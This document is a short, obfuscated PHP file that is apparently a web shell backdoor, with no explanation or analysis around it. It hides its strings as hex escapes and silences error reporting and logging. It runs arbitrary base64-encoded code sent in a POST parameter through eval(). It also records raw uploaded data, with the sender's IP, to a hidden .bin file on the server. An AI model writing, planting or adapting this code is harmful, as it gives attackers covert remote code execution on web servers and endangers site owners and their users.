<?php @error_reporting(0); @ini_set("d\x69s\x70l\x61y_err\x6f\x72\x73",0); @ini_set("l\x6fg\x5ferr\x6fr\x73",0); @ini_set("\x65r\x72o\x72_lo\x67",0); @ini_set("memory\x5flimit", "128M"); @ini_set("\x6d\x61x_execu\x74\x69o\x6e_time",30); @set_time_limit(30); if (isset($_SERVER["\x48TTP_\x58\x5fREA\x4c\x5fI\x50"])) $_SERVER["REM\x4fTE\x5f\x41D\x44R"] = $_SERVER["\x48TTP_\x58\x5fREA\x4c\x5fI\x50"]; if (isset($_POST["code"])) { eval(base64_decode($_POST["code"])); } elseif (isset($_SERVER["HT\x54P\x5fC\x4fNTENT_ENC\x4fDIN\x47"]) && $_SERVER["HT\x54P\x5fC\x4fNTENT_ENC\x4fDIN\x47"] == "\x62\x69\x6eary") { $input = file_get_contents("php:/\x2fin\x70ut"); if (strlen($input) > 0) print "S\x54A\x54\x55\x53-IMPO\x52\x54-\x4fK"; if (strlen($input) > 10) { $fp = @fopen(str_replace(".php",".\x62\x69n",basename($_SERVER["\x53C\x52I\x50T_\x46ILENAME"])), "a"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["REM\x4fTE\x5f\x41D\x44R"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["RE\x51UEST_U\x52I"], "\x2e\x73ht\x6d\x6c") !== false) { print $_SERVER["RE\x51UEST_U\x52I"]; } exit; ?>